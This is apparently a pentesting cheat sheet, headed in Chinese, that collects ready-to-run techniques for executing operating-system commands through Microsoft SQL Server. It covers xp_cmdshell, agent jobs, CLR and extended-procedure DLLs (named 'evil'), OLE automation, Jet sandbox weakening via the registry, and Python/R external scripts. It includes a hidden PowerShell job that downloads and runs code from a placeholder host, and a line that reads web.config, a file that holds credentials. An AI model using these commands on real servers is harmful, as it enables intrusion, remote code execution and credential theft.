## 命令执行

### xp_cmdshell

```sql
-- Enable show advanced options
sp_configure 'show advanced options', 1
RECONFIGURE
GO

-- Enable xp_cmdshell
sp_configure 'xp_cmdshell', 1
RECONFIGURE
GO

EXEC xp_cmdshell 'net user'
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

### 创建PowerShell代理工作

```sql
USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://IP_OR_HOSTNAME/file''))"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';
```

### 编写CLR dll

[公共语言运行时 (CLR)](https://docs.microsoft.com/en-us/dotnet/standard/clr) 程序集作为 .NET DLL（或组） DLL），可以导入到 SQL Server 中。导入后，DLL 方法可以链接到存储过程并通过 TSQL 执行。

编写c:tempcmd_exec.cs文件：
```c
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.IO;
using System.Diagnostics;
using System.Text;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec (SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:WindowsSystem32cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        // Create the record and specify the metadata for the columns.
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

        // Mark the beginning of the result set.
        SqlContext.Pipe.SendResultsStart(record);

        // Set values for each column in the row
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

        // Send the row back to the client.
        SqlContext.Pipe.SendResultsRow(record);

        // Mark the end of the result set.
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
};
```

查找csc.exe以便编译文件：
```bash
Get-ChildItem -Recurse "C:WindowsMicrosoft.NET" -Filter "csc.exe" | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname
```

使用以下命令编译文件：
```bash
C:WindowsMicrosoft.NETFramework64v4.0.30319csc.exe /target:library c:tempcmd_exec.cs
```

将新 DLL 导入 SQL Server（SQL 登录用户需要 sysadmin 权限、CREATE ASSEMBLY 权限或 ALTER ASSEMBLY 权限）：
```sql
-- Select the msdb database
use msdb

-- Enable show advanced options on the server
sp_configure 'show advanced options',1
RECONFIGURE
GO

-- Enable clr on the server
sp_configure 'clr enabled',1
RECONFIGURE
GO

-- Import the assembly
CREATE ASSEMBLY my_assembly
FROM 'c:tempcmd_exec.dll'
WITH PERMISSION_SET = UNSAFE;

-- Link the assembly to a stored procedure
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
GO

cmd_exec 'whoami';
```

删除:
```sql
DROP PROCEDURE cmd_exec
DROP ASSEMBLY my_assembly
```

### 自定义扩展存储过程

```sql
// DllMain.cpp
// Reference: http://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure
// Note: Compile for 32 and 64
// Manual
//  rundll32 evil32.dll,RunCmd
//  rundll32 evil32.dll,RunPs
//  rundll32 evil64.dll,RunCmd
//  rundll32 evil64.dll,RunPs
// Register DLL in SQL Server Examples
//  sp_addextendedproc 'RunCmd', 'c:\Temp\evil32.dll';
//  sp_addextendedproc 'RunCmd', 'c:\Temp\evil64.dll';
//  sp_addextendedproc 'RunPs', 'c:\Temp\evil32.dll';
//  sp_addextendedproc 'RunPs', 'c:\Temp\evil64.dll';
//  sp_addextendedproc 'RunPs', '\\server\share\evil64.dll';  :) - DLL doesn't need to be hosted on target system's disk
// Run Command Examples
//  RunCmd "whoami"
//  RunPs "write-output 'Hellow World' | Out-File c:\temp\file.txt"
// Remove Procedures
//  sp_dropextendedproc 'RunCmd';
//  sp_dropextendedproc 'RunPs';
// Todo: https://technet.microsoft.com/en-us/library/aa197372(v=sql.80).aspx

#include "stdafx.h"			//dllmain.cpp : Defines the entry point for the DLL application.
#include "srv.h"			//Must get from C:\Program Files (x86)\Microsoft SQL Server\80\Tools\DevTools\Include            
#include "shellapi.h"		//needed for ShellExecute          
#include "string"			//needed for std:string  

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	system("echo This is a test. > c:\\Temp\\test_dllmain.txt");
	return 1;
}

#define RUNCMD_FUNC extern "C" __declspec (dllexport)     
RUNCMD_FUNC int __stdcall RunCmd(const char * Command) {

	// Run OS command with ShellExecute
	ShellExecute(NULL, TEXT("open"), TEXT("cmd"), TEXT(" /C echo This is a test. > c:\\Temp\\test_cmd2.txt"), TEXT(" C:\\ "), SW_SHOW);

	// Run OS command with system hard coded
	system("echo This is a test. > c:\\Temp\\test_cmd1.txt");

	// Run OS command with system hard coded from variable
	const char *pdata = "echo This is a test. > c:\\Temp\\test_cmd3.txt";
	system(pdata);

	// Run OS command with system from arg
	system(Command);

	return 1;
}

#define RUNPS_FUNC extern "C" __declspec (dllexport)     
RUNPS_FUNC int __stdcall RunPs(const char * Command) {

	// Run PowerShell command
	ShellExecute(NULL, TEXT("open"), TEXT("powershell"), TEXT(" -C \" 'This is a test.'|out-file c:\\temp\\test_ps2.txt \" "), TEXT(" C:\\ "), SW_SHOW);
	system("PowerShell -C \"'This is a test.'|out-file c:\\temp\\test_ps1.txt\"");

	return 1;
}
```

### TSQL 执行系统命令

#### ActiveX Javascript Agent Job

```sql
USE [msdb]
GO

/****** Object:  Job [OS COMMAND EXECUTION EXAMPLE - ActiveX: JSCRIPT]    Script Date: 8/29/2017 11:17:16 AM ******/
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
/****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 8/29/2017 11:17:16 AM ******/
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END

DECLARE @jobId BINARY(16)
DECLARE @user varchar(8000)
SET @user = SYSTEM_USER
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'OS COMMAND EXECUTION EXAMPLE - ActiveX: JSCRIPT',
		@enabled=1,
		@notify_level_eventlog=0,
		@notify_level_email=0,
		@notify_level_netsend=0,
		@notify_level_page=0,
		@delete_level=1,
		@description=N'No description available.',
		@category_name=N'[Uncategorized (Local)]',
		@owner_login_name=@user, @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
/****** Object:  Step [RUN COMMAND - ActiveX: JSCRIPT]    Script Date: 8/29/2017 11:17:16 AM ******/
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'RUN COMMAND - ActiveX: JSCRIPT',
		@step_id=1,
		@cmdexec_success_code=0,
		@on_success_action=1,
		@on_success_step_id=0,
		@on_fail_action=2,
		@on_fail_step_id=0,
		@retry_attempts=0,
		@retry_interval=0,
		@os_run_priority=0, @subsystem=N'ActiveScripting',
		@command=N'function RunCmd()
{
	var objShell = new ActiveXObject("shell.application");
        	objShell.ShellExecute("cmd.exe", "/c echo hello > c:\\windows\\temp\\blah.txt", "", "open", 0);
 }

RunCmd();
',
/** alternative option
		@command=N'function RunCmd()
					{
						 var WshShell = new ActiveXObject("WScript.Shell");  
						  var oExec = WshShell.Exec("c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\blah.txt");
						  oExec = null;
						  WshShell = null;
					 }

					RunCmd();
					',

**/
		@database_name=N'JavaScript',
		@flags=0
		--,@proxy_name=N'WinUser1'		
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO


use msdb
EXEC dbo.sp_start_job N'OS COMMAND EXECUTION EXAMPLE - ActiveX: JSCRIPT' ;
```

#### ActiveX VBScript Agent Job

```sql
USE [msdb]
GO

/****** Object:  Job [OS COMMAND EXECUTION EXAMPLE - ActiveX: VBSCRIPT]    Script Date: 8/29/2017 10:27:36 AM ******/
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
/****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 8/29/2017 10:27:36 AM ******/
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END

DECLARE @jobId BINARY(16)
DECLARE @user varchar(8000)
SET @user = SYSTEM_USER
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'OS COMMAND EXECUTION EXAMPLE - ActiveX: VBSCRIPT',
		@enabled=1,
		@notify_level_eventlog=0,
		@notify_level_email=0,
		@notify_level_netsend=0,
		@notify_level_page=0,
		@delete_level=1,
		@description=N'No description available.',
		@category_name=N'[Uncategorized (Local)]',
		@owner_login_name=@user, @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
/****** Object:  Step [RUN COMMAND - ActiveX: VBSCRIPT]    Script Date: 8/29/2017 10:27:36 AM ******/
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'RUN COMMAND - ActiveX: VBSCRIPT',
		@step_id=1,
		@cmdexec_success_code=0,
		@on_success_action=1,
		@on_success_step_id=0,
		@on_fail_action=2,
		@on_fail_step_id=0,
		@retry_attempts=0,
		@retry_interval=0,
		@os_run_priority=0, @subsystem=N'ActiveScripting',
		@command=N'FUNCTION Main()

dim shell
set shell= CreateObject ("WScript.Shell")
shell.run("c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\blah.txt")
set shell = nothing

END FUNCTION',
		@database_name=N'VBScript',
		@flags=0
		--,@proxy_name=N'WinUser1'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO

use msdb
EXEC dbo.sp_start_job N'OS COMMAND EXECUTION EXAMPLE - ActiveX: VBSCRIPT' ;  
```

#### cmdexec Agent Job

```sql
USE [msdb]
GO

/****** Object:  Job [OS COMMAND EXECUTION EXAMPLE - CMDEXEC]    Script Date: 8/29/2017 11:23:50 AM ******/
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
/****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 8/29/2017 11:23:50 AM ******/
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END

DECLARE @jobId BINARY(16)
DECLARE @user varchar(8000)
SET @user = SYSTEM_USER
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'OS COMMAND EXECUTION EXAMPLE - CMDEXEC',
		@enabled=1,
		@notify_level_eventlog=0,
		@notify_level_email=0,
		@notify_level_netsend=0,
		@notify_level_page=0,
		@delete_level=1,
		@description=N'No description available.',
		@category_name=N'[Uncategorized (Local)]',
		@owner_login_name=@user, @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
/****** Object:  Step [RUN COMMAND  - CMDEXEC]    Script Date: 8/29/2017 11:23:50 AM ******/
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'RUN COMMAND  - CMDEXEC',
		@step_id=1,
		@cmdexec_success_code=0,
		@on_success_action=1,
		@on_success_step_id=0,
		@on_fail_action=2,
		@on_fail_step_id=0,
		@retry_attempts=0,
		@retry_interval=0,
		@os_run_priority=0, @subsystem=N'CmdExec',
		@command=N'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\blah.txt',
		@flags=0
		--,@proxy_name=N'WinUser1'		
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO

use msdb
EXEC dbo.sp_start_job N'OS COMMAND EXECUTION EXAMPLE - CMDEXEC' ;
```

#### Powershell Agent Job

```sql
USE [msdb]
GO

/****** Object:  Job [OS COMMAND EXECUTION EXAMPLE - POWERSHELL]    Script Date: 8/29/2017 11:28:39 AM ******/
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
/****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 8/29/2017 11:28:39 AM ******/
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END

DECLARE @jobId BINARY(16)
DECLARE @user varchar(8000)
SET @user = SYSTEM_USER
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'OS COMMAND EXECUTION EXAMPLE - POWERSHELL',
		@enabled=1,
		@notify_level_eventlog=0,
		@notify_level_email=0,
		@notify_level_netsend=0,
		@notify_level_page=0,
		@delete_level=1,
		@description=N'No description available.',
		@category_name=N'[Uncategorized (Local)]',
		@owner_login_name=@user, @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
/****** Object:  Step [RUN COMMAND - POWERHSHELL]    Script Date: 8/29/2017 11:28:39 AM ******/
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'RUN COMMAND - POWERHSHELL',
		@step_id=1,
		@cmdexec_success_code=0,
		@on_success_action=1,
		@on_success_step_id=0,
		@on_fail_action=2,
		@on_fail_step_id=0,
		@retry_attempts=0,
		@retry_interval=0,
		@os_run_priority=0, @subsystem=N'PowerShell',
		@command=N'write-output "hello world" | out-file c:\windows\temp\blah.txt',
		@database_name=N'master',
		@flags=0
		--,@proxy_name=N'WinUser1'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO

use msdb
EXEC dbo.sp_start_job N'OS COMMAND EXECUTION EXAMPLE - POWERSHELL' ;
```

#### 自定义命令 Shell

```sql
# Register xp via local path: sp_addextendedproc 'RunPs', 'c:\myxp.dll'
# Register xp via UNC path: sp_addextendedproc 'RunPs', '\\servername\pathtofile\myxp.dll'
# Run: exec RunPs
# Unregister xp: sp_dropextendedproc 'RunPs'


#include "stdio.h"
#include "stdafx.h"
#include "srv.h"
#include "shellapi.h"
#include "string"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call)
{ 	
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
	break;
}

return 1;
 }

 __declspec(dllexport) ULONG __GetXpVersion() {
return 1;
}

#define RUNCMD_FUNC extern "C" __declspec (dllexport)
RUNPS_FUNC int __stdcall RunPs(const char * Command) {
ShellExecute(NULL, TEXT("open"), TEXT("powershell"), TEXT(" -C \" 'This is a test.'|out-file c:\\temp\\test_ps2.txt \" "), TEXT(" C:\\ "), SW_SHOW);
system("PowerShell -C \"'This is a test.'|out-file c:\\temp\\test_ps1.txt\"");
return 1;
}
```

#### OLE 自动化对象

```sql
-- This is a TSQL template for executing OS commands through SQL Server using OLE Automation Procedures.

-- Enable Show Advanced Options
sp_configure 'Show Advanced Options',1
RECONFIGURE
GO

-- Enable OLE Automation Procedures
sp_configure 'Ole Automation Procedures',1
RECONFIGURE
GO

-- Execute Command via OLE and store output in temp file
DECLARE @Shell INT
DECLARE @Shell2 INT
EXEC Sp_oacreate 'wscript.shell', @Shell Output, 5
EXEC Sp_oamethod @shell, 'run' , null, 'cmd.exe /c "echo Hello World > c:\windows\temp\file.txt"'

-- Read results
DECLARE @libref INT
DECLARE @filehandle INT
DECLARE @FileContents varchar(8000)

EXEC sp_oacreate 'scripting.filesystemobject', @libref out
EXEC sp_oamethod @libref, 'opentextfile', @filehandle out, 'c:\windows\temp\file.txt', 1
EXEC sp_oamethod @filehandle, 'readall', @FileContents out

SELECT @FileContents
GO

-- Remove temp result file
DECLARE @Shell INT
EXEC Sp_oacreate 'wscript.shell', @Shell Output, 5
EXEC Sp_oamethod @Shell, 'run' , null, 'cmd.exe /c "DEL c:\windows\temp\file.txt"'
GO

-- Disable Show Advanced Options
sp_configure 'Show Advanced Options',1
RECONFIGURE
GO

-- Disable OLE Automation Procedures
sp_configure 'Ole Automation Procedures',1
RECONFIGURE
GO
```

#### OpenRowSet

```sql
-- WORK IN PROGRESS
-- Targeting custom DSN via linked query (openquery), openrowset, opendatasource
-- Target xls and mdb variations
-- May require https://www.microsoft.com/en-us/download/details.aspx?id=13255 on modern version...
-- exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1

-- Enable show advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable ad hoc queries
sp_configure 'ad hoc distributed queries',1
reconfigure
go

-- Verify the configuration change
select * from master.sys.configurations where name like '%ad%'

-- Losen restrictions
-- EXEC sp_MSset_oledb_prop
EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'AllowInProcess', 1
EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'DynamicParameters', 1
EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0'

EXEC sp_MSset_oledb_prop N'Microsoft.Jet.OLEDB.4.0', N'AllowInProcess', 1 -- Errors
EXEC sp_MSset_oledb_prop N'Microsoft.Jet.OLEDB.4.0', N'DynamicParameters', 1
EXEC sp_MSset_oledb_prop N'Microsoft.Jet.OLEDB.4.0'

　
-- Create linked servers
-- Note: xp_dirtree could potentially be used to identify mdb or xls files on the database server
exec sp_addlinkedserver @server='Access_4',
@srvproduct='Access',
@provider='Microsoft.Jet.OLEDB.4.0',
@datasrc='C:\Windows\Temp\SystemIdentity.mdb'

exec sp_addlinkedserver @server='Access_12',
@srvproduct='Access',
@provider='Microsoft.ACE.OLEDB.12.0',
@datasrc='C:\Windows\Temp\SystemIdentity.mdb'

EXEC master.dbo.sp_addlinkedserver @server = N'excelxx',
@srvproduct=N'Excel', @provider=N'Microsoft.ACE.OLEDB.12.0',
@datasrc=N'C:\windows\temp\test.xls', @provstr=N'Excel 15.0'

-- List linked servers
select * from master..sysservers

-- Attempt queries
SELECT * from openquery([Access_4],'select 1')
SELECT * from openquery([Access_12],'select 1')
SELECT * from openquery([Access],'select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')
SELECT * FROM OPENROWSET('Microsoft.Jet.OLEDB.4.0','Excel 8.0;Database=C:\windows\temp\test.xls', 'SELECT * FROM [Sheet1$]')

-- Drop linked servers
sp_dropserver "Access_4"
sp_dropserver "Access_12"

-- List linked servers
select * from master..sysservers

-- Look into additional examples for cmd exec
SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0','Excel 12.0;Database=C:\windows\temp\test.xls', 'SELECT * FROM [Sheet1$]')
select * from openrowset('SQLOLEDB',';database=C:\Windows\Temp\SystemIdentity.mdb','select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')
select * from openrowset('microsoft.jet.oledb.4.0',';database=C:\Windows\System32\LogFiles\Sum\Current.mdb','select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')
INSERT INTO OPENROWSET ('Microsoft.Jet.OLEDB.4.0', 'Excel 8.0;Database=G:\Test.xls;', 'SELECT * FROM [Sheet1$]')
SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Excel 8.0;Database=C:\testing.xlsx;', 'SELECT Name, Class FROM [Sheet1$]')
SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0','Text;Database=C:\Temp\;','SELECT * FROM [Test.csv]')
SELECT * FROM OpenDataSource( 'Microsoft.Jet.OLEDB.4.0','Data Source="c:\test.xls";User ID=Admin;Password=;Extended properties=Excel 5.0')
select * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0','Excel 5.0;HDR=YES;DATABASE=c:\Book1.xls',Sheet1$)
GO

-- Sample sources
-- https://stackoverflow.com/questions/36987636/cannot-create-an-instance-of-ole-db-provider-microsoft-jet-oledb-4-0-for-linked
-- https://blogs.msdn.microsoft.com/spike/2008/07/23/ole-db-provider-microsoft-jet-oledb-4-0-for-linked-server-null-returned-message-unspecified-error/


-- source: https://www.sqlservercentral.com/Forums/PrintTopic1121430.aspx

-- Enable show advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable ad hoc queries
sp_configure 'ad hoc distributed queries',1
reconfigure
go

EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'AllowInProcess', 1
EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'DynamicParameters', 1

--===== This is an innocent enough setup.
EXEC sp_addlinkedserver 'testsql','OLE DB Provider for Jet','Microsoft.Jet.OLEDB.4.0','C:\Windows\Temp\SystemIdentity.mdb';
go
--===== This verifies the current mode of the Jet engine so we can later verify that we set it back correctly.
EXEC master..xp_regread  'HKEY_LOCAL_MACHINE' ,'Software\Microsoft\Jet\4.0\engines','SandBoxMode'; --Verify that it's a "2" for normal mode
go
--===== This makes it a wee bit more agressive.  I'm using xp_rewrite to simulate an attack that can be made via T-SQL
     -- using a different method and without "SA" privs which I will not post nor provide a link to.
EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1; --Set a more aggressive mode
EXEC master..xp_regread  'HKEY_LOCAL_MACHINE' ,'Software\Microsoft\Jet\4.0\engines','SandBoxMode'; --Verify that it's a "1" for normal mode
go
--===== This runs a harmless DOS command (DIR) but shows that once the "SandBoxMode" has been changed via a hack, DOS is available
     -- through OPENROWSET.
SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',';database=C:\temp\ODBC.mdb','select shell("cmd.exe /c echo hello there c:\ > C:\windows\temp\test123.txt") as blah');
go
SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',';database=C:\temp\ODBC.mdb','select 1 as blah');
SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0',';database=C:\temp\ODBC.mdb','select ''stringvalue'' as blah');

--===== Cleanup
EXEC sp_dropserver 'testsql' --Drops the linked server we created above.
EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',2 --Return to normal mode
EXEC master..xp_regread  'HKEY_LOCAL_MACHINE' ,'Software\Microsoft\Jet\4.0\engines','SandBoxMode' --Verify that it's a "2" for normal mode
```

#### Python

```sql
-- Requirement: Python must be setup during the installation.

-- Enable advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable external scripts
-- Requires a restart of the SQL Server service to take effect
-- User must have "EXECUTE ANY EXTERNAL SCRIPT" privilege
sp_configure 'external scripts enabled',1
reconfigure WITH OVERRIDE
go

-- Run OS command via Python
-- Source: https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5
exec sp_execute_external_script
@language =N'Python',
@script=N'import subprocess
p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE)
OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
WITH RESULT SETS (([cmd_out] nvarchar(max)))

-- Get Python version
-- Source: https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5
exec sp_execute_external_script
@language =N'Python',
@script=N'import sys
OutputDataSet = pandas.DataFrame([sys.version])'
WITH RESULT SETS ((python_version nvarchar(max)))

-- Disable external scripts
sp_configure 'external scripts enabled',0
reconfigure
go

-- Disable advanced options
sp_configure 'show advanced options',0
reconfigure
go
```

```sql
#Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```

#### Rscript

```sql
-- Requirement: R must be setup during the installation.

-- Enable advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable external scripts
-- Requires a restart of the SQL Server service to take effect
-- User must have "EXECUTE ANY EXTERNAL SCRIPT" privilege
sp_configure 'external scripts enabled',1
reconfigure WITH OVERRIDE
go

EXEC sp_execute_external_script
  @language=N'R',
  @script=N'OutputDataSet <- data.frame(system("cmd.exe /c dir",intern=T))'
  WITH RESULT SETS (([cmd_out] text));
GO

-- Disable external scripts
-- Requires a restart of the SQL Server service to take effect
sp_configure 'external scripts enabled',0
reconfigure WITH OVERRIDE
go

-- Disable advanced options
sp_configure 'show advanced options',0
reconfigure
go
```

#### xp_cmdshell proxy

```sql
-- Summary
-- Create a SQL Server login that maps to a database user/role
-- that has been given explicit privs to execute xp_cmdshell
-- once the xp_proxy_account has been configured with valid windows credentials

USE MASTER;
GO

-- enable xp_cmdshell on the server
sp_configure 'show advanced options',1
reconfigure
go

sp_configure 'xp_cmdshell',1
reconfigure
go

-- Create login from windows user
CREATE LOGIN [SQLServer1\User1] FROM WINDOWS;

-- Create xp_cmdshell_proxy
EXEC sp_xp_cmdshell_proxy_account 'SQLServer1\User1', 'Password!';

-- Create database role
CREATE ROLE [CmdShell_Executor] AUTHORIZATION [dbo]

-- Grant role privs to execute xp_cmdshell using proxy
GRANT EXEC ON xp_cmdshell TO [CmdShell_Executor]

-- Create a database user
CREATE USER [user1] FROM LOGIN [user1];

-- Add database user to the role
EXEC sp_addrolemember [CmdShell_Executor],[user1];

-- Grant user1 database user privs to execute xp_cmdshell using proxy directly
GRANT EXEC ON xp_cmdshell TO [user1]


-- Login as user1 - will show SQLServere1\User1 instead of service account
xp_cmdshell 'whoami'
```

### HTTP请求

[SQLHttp](https://github.com/infiniteloopltd/SQLHttp)
